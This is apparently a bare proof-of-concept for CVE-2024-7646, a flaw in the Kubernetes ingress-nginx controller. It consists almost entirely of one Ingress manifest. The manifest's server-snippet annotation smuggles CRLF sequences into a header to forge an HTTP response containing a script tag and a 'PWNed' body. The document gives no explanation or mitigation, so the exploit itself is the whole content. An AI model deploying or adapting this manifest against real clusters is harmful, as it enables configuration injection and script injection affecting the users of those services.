# CVE-2024-7646
PoC CVE-2024-7646
```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: example-ingress
  annotations:
    nginx.ingress.kubernetes.io/server-snippet: |
      add_header X-Pwn-Header "Pwn\r\n
      HTTP/1.1 200 OK
      Content-Type: text/html
      <script>alert('XSS');</script>
      --------";
      return 200 "PWNed";
spec:
  rules:
    - http:
        paths:
          - pathType: Prefix
            path: /
            backend:
              service:
                name: test-service
                port:
                  number: 8080
```
